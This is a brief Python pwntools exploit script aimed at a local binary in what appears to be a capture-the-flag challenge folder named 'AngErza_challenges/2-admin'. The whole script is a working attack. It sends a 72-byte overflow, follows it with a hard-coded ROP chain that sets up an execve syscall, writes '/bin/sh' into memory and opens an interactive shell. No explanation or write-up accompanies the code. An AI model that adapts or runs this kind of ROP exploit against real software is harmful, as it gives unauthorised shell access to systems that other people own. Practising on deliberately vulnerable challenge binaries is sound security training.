from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/AngErza_challenges/2-admin/admin")
pwn.gdb.attach(p)
payload = b"\x00" * 72
payload += p64(0x400416) + p64(0x415544) + p64(0x0) + p64(0x400686) + p64(0x0) + p64(0x410193) + p64(0x6bb2e0) + p64(0x44bcc6) + p64(0x8) + p64(0x474d15) + p64(0x415544) + p64(0x3b) + p64(0x400686) + p64(0x6bb2e0) + p64(0x410193) + p64(0x0) + p64(0x44bcc6) + p64(0x0) + p64(0x474d15)
payload += b"\n"
p.send(payload)
payload = b""
payload += b'/bin/sh\x00'
p.send(payload)
p.interactive()
